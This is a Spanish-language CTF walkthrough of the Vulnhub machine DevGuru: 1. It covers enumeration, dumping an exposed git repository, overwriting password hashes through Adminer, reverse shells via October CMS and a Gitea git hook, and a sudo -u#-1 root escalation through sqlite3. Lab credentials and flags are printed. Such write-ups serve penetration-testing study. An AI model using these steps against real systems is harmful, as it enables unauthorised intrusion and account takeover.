---
title: DevGuru1 Writeup - Vulnhub
date: 2025-03-16
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, DevGuru1, OSCP Prep]
image:
  path: /assets/img/commons/vulnhub/devguru/portada.png
---

Anterior [*OSCP Lab 24*](https://lvs3c.github.io/posts/OSCP-Tiki1/)

¡Saludos!

**`OSCP Lab 25`**

En este writeup, realizaremos la máquina [**DevGuru: 1**](https://www.vulnhub.com/entry/devguru-1,620/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **Fuzzing de archivos y directorios**.
- **Recuperar** proyecto **Git**, obteniendo credenciales de acceso.
- **Alterar** datos de la base para ingresar al panel del **CMS October**, modificando archivos de configuración para ganar acceso al servidor.
- **User Pivoting** mediante la moficación de proyecto `git`{: .filepath} privado, ganando acceso a la máquina como el usuario.
- Y por último, elevar privilegios teniendo permisos sobre **SQLite3**, explotando **sudo**. Listamos la root flag.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.59     00:0c:29:50:5d:3a       VMware, Inc.
10.11.12.200    00:50:56:e7:5f:a3       VMware, Inc.

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.611 seconds (98.05 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.59
PING 10.11.12.59 (10.11.12.59) 56(84) bytes of data.
64 bytes from 10.11.12.59: icmp_seq=1 ttl=64 time=0.538 ms

--- 10.11.12.59 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.538/0.538/0.538/0.000 ms
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p- -sCV 10.11.12.59 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 10:58 -03
Nmap scan report for 10.11.12.59
Host is up (0.0020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)
|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-git:
|   10.11.12.59:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project type: PHP application (guessed from .gitignore)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: DevGuru
|_http-title: Corp - DevGuru
8585/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=90dea2cc78943e06; Path=/; HttpOnly
|     Set-Cookie: _csrf=8CUiZZV1mYtGSnPxukb7k24vlbE6MTc0MjMwNjMxOTIzMjU4MzQxOQ; Path=/; Expires=Wed, 19 Mar 2025 13:58:39 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 18 Mar 2025 13:58:39 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=5ca2d06e5904276f; Path=/; HttpOnly
|     Set-Cookie: _csrf=czVeQ-0U3VIQT8FvYuaYL8gQ67g6MTc0MjMwNjMxOTM3NjMxNDY3MA; Path=/; Expires=Wed, 19 Mar 2025 13:58:39 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 18 Mar 2025 13:58:39 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8585-TCP:V=7.94SVN%I=7%D=3/18%Time=67D97C0F%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,2A00,"HTTP/1\.0\x20200\x20OK\r\nContent-Typ
SF:e:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path
SF:=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=90dea2cc78943e
SF:06;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=8CUiZZV1mYtGSnPxukb7
SF:k24vlbE6MTc0MjMwNjMxOTIzMjU4MzQxOQ;\x20Path=/;\x20Expires=Wed,\x2019\x2
SF:0Mar\x202025\x2013:58:39\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAM
SF:EORIGIN\r\nDate:\x20Tue,\x2018\x20Mar\x202025\x2013:58:39\x20GMT\r\n\r\
SF:n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<hea
SF:d\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t
SF:<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<tit
SF:le>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<l
SF:ink\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"us
SF:e-credentials\">\n\t<meta\x20name=\"theme-color\"\x20content=\"#6cc644\
SF:">\n\t<meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x
SF:20a\x20cup\x20of\x20tea\"\x20/>\n\t<meta\x20name=\"description\"\x20con
SF:tent=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20
SF:painless")%r(HTTPOptions,212A,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCont
SF:ent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\
SF:x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=5ca2d06
SF:e5904276f;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=czVeQ-0U3VIQT
SF:8FvYuaYL8gQ67g6MTc0MjMwNjMxOTM3NjMxNDY3MA;\x20Path=/;\x20Expires=Wed,\x
SF:2019\x20Mar\x202025\x2013:58:39\x20GMT;\x20HttpOnly\r\nX-Frame-Options:
SF:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2018\x20Mar\x202025\x2013:58:39\x20GMT
SF:\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\"
SF:>\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x
SF:20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1
SF:\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\
SF:n\t<title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x20a\x
SF:20cup\x20of\x20tea\x20</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/
SF:manifest\.json\"\x20crossorigin=\"use-credentials\">\n\t<meta\x20name=\
SF:"theme-color\"\x20content=\"#6cc644\">\n\t<meta\x20name=\"author\"\x20c
SF:ontent=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/>\n\t
SF:<meta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\x20a\
SF:x20c");
MAC Address: 00:0C:29:50:5D:3A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.03 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 7.6p1`.
- Puerto `80` servidor `Apache httpd 2.4.29`.
- Puerto `8585` sin resultado.


### HTTP - 80

Validamos las webs.

![web80](/assets/img/commons/vulnhub/devguru/web80.png){: .center-image }
![web8585](/assets/img/commons/vulnhub/devguru/web8585.png){: .center-image }


Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ sudo nmap -p80,8585 --script http-enum 10.11.12.59 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 11:03 -03
Nmap scan report for 10.11.12.59
Host is up (0.00082s latency).

PORT     STATE SERVICE
80/tcp   open  http
| http-enum:
|   /.gitignore: Revision control ignore file
|   /.htaccess: Incorrect permissions on .htaccess or .htpasswd files
|   /.git/HEAD: Git folder
|   /0/: Potentially interesting folder
|_  /services/: Potentially interesting folder
8585/tcp open  unknown
MAC Address: 00:0C:29:50:5D:3A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 24.38 seconds
```

Validamos el archivo `.htaccess` y encontramos la entrada `/adminer.php`{: .filepath}.

![htaccess](/assets/img/commons/vulnhub/devguru/htaccess.png){: .center-image }
![adminer](/assets/img/commons/vulnhub/devguru/adminer.png){: .center-image }

Además, estamos frente a un proyecto `git`{: .filepath}. Procedemos a descargarlo en la carpeta *src*, ejecutando `git-dumper`.

```bash
❯ git-dumper http://10.11.12.59/.git/ src
```

Verificando los archivos encontrados, damos con la contraseña de acceso a la base de datos.

![mysqlcon](/assets/img/commons/vulnhub/devguru/mysqlcon.png){: .center-image }

Ingresamos al panel con dichas credenciales.

![adminer2](/assets/img/commons/vulnhub/devguru/adminer2.png){: .center-image }

Recorriendo la base de datos, damos con el usuario `frank`.

Validamos el hash de la password y es `bcrypt`.

![validbcrypt](/assets/img/commons/vulnhub/devguru/validbcrypt.png){: .center-image }

Lo que vamos a hacer ahora, es cambiar la contraseña de `frank` por una nuestra.

![bcrypt](/assets/img/commons/vulnhub/devguru/bcrypt.png){: .center-image }

![frank](/assets/img/commons/vulnhub/devguru/frank.png){: .center-image }

Nos dirigimos al panel de login e ingresamos.

![accesspanel](/assets/img/commons/vulnhub/devguru/accesspanel.png){: .center-image }


## Explotación

---

Una vez dentro del portal, debemos modificar algún archivo de configuración para poder ingresar nuestro código.

En este caso vamos a ingresar nuestro código en la página principal y debemos atachar la variable también.

![rs1](/assets/img/commons/vulnhub/devguru/rs1.png){: .center-image }
![rs2](/assets/img/commons/vulnhub/devguru/rs2.png){: .center-image }

Comprobamos y generamos la reverse shell.

![rs3](/assets/img/commons/vulnhub/devguru/rs3.png){: .center-image }
![rs4](/assets/img/commons/vulnhub/devguru/rs4.png){: .center-image }

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.59] 37286
bash: cannot set terminal process group (1079): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devguru:/var/www/html$
```

## User Pivoting

---

Somos `www-data`{: .filepath}, debemos ganar acceso como `frank`{: .filepath}.

Buscando los archivos de backup, encontramos los datos de acceso a `mysql` pero correspondiente a otro usuario.

```bash
www-data@devguru:/var/backups$ cat app.ini.bak

[database]
; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD              = UfFPTF8C8jjxVF2m
```

Volvemos a ingresar a `adminer`{: .filepath} con estos datos.

![giteasql](/assets/img/commons/vulnhub/devguru/giteasql.png){: .center-image }

Encontramos nuevamente el usuario `frank` pero corresponde a la web sobre el puerto 8585.

![giteauserfrank](/assets/img/commons/vulnhub/devguru/giteauserfrank.png){: .center-image }

Le cambiamos la contraseña y su método de encriptado al usuario, utilizando la misma que al principio.

![frankbcryptgit](/assets/img/commons/vulnhub/devguru/frankbcryptgit.png){: .center-image }

Ingresamos.

![gitpanelaccess](/assets/img/commons/vulnhub/devguru/gitpanelaccess.png){: .center-image }

Encontramos un proyecto privado del usuario *frank*. Lo alteramos para lanzarnos la reverse shell.

![devguru1](/assets/img/commons/vulnhub/devguru/devguru1.png){: .center-image }

Primero debemos modificar los `git-hooks` en `settings`{: .filepath}.

![devguru2](/assets/img/commons/vulnhub/devguru/devguru2.png){: .center-image }
![devguru3](/assets/img/commons/vulnhub/devguru/devguru3.png){: .center-image }
![devguru4](/assets/img/commons/vulnhub/devguru/devguru4.png){: .center-image }

Una vez realizado este paso, debemos modificar algún archivo de configuración del proyecto para ejecutar el commit.

![devguru5](/assets/img/commons/vulnhub/devguru/devguru5.png){: .center-image }

Guardamos los cambios.

Nos ponemos en escucha y obtenemos la shell.

```bash
❯ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.59] 49776
bash: cannot set terminal process group (775): Inappropriate ioctl for device
bash: no job control in this shell
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ 
```

## Escalación de privilegios

---

Somos `frank`.

Listamos la user flag.

```bash
frank@devguru:/home/frank$ cat user.txt
22854d0aec6ba776f9d35bf7b0e00217
```

Listamos los permisos del usuario sobre el sistema *(sudo -l)* y tenemos permisos sobre `sqlite3`.

```bash
frank@devguru:~$ sudo -l
Matching Defaults entries for frank on devguru:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on devguru:
    (ALL, !root) NOPASSWD: /usr/bin/sqlite3
```

Validamos la versión de sudo.

```bash
frank@devguru:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Buscamos por GTFObins y usamos un exploit ya que sudo es vulnerable.

![gtfobins](/assets/img/commons/vulnhub/devguru/gtfobins.png){: .center-image }
![exploit](/assets/img/commons/vulnhub/devguru/exploit.png){: .center-image }

Listamos la root flag.

```bash
frank@devguru:~$ sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/sh'
# id
uid=0(root) gid=1000(frank) groups=1000(frank)
# cd /root
# ls
msg.txt  root.txt
# cat msg.txt

           Congrats on rooting DevGuru!
  Contact me via Twitter @zayotic to give feedback!


# cat root.txt
96440606fb88aa7497cde5a8e68daf8f
#
```

Hope it helps!